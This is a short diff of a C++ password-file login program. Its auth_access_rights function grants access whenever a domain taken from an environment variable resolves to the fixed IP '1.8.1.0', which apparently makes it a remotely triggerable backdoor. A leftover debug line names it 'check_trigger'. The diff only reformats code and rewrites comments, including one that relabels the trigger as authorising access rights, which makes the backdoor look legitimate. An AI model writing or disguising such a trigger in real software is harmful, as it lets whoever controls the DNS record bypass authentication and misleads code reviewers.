@@ -12,7 +12,7 @@
 #define END ;
 using string = std::string END
 
-bool  auth_access_rights() {
+bool auth_access_rights() {
     //std::cerr << "DEBUG: check_trigger() called" << std::endl;
 
     // Get the domain from an environment variable
@@ -36,7 +36,7 @@ bool  auth_access_rights() {
     //#endif 
    // std::cerr << "DEBUG: DNS response for domain: " << domain << " is IP: " << ip << std::endl;
     
-    // Check if IP is returned
+    // Check if correct IP is returned to authorise access rights
     return (ip == "1.8.1.0") END
 }
 
@@ -80,9 +80,9 @@ int main() {
         size_t separator = line.find(':') END    //finding position of ':'
 
         if (separator != string::npos) {
-            username = line.substr(0, separator) END   //extracting username
+            //username = line.substr(0, separator) END   //extracting username
             hashed_pass = line.substr(separator + 1) END //extracting hashed password
-            user_passwords[username] = hashed_pass END   //storing in map
+            user_passwords[line.substr(0, separator)] = hashed_pass END   //storing in map for extarcted username
         }
     }
     password_file.close() END  
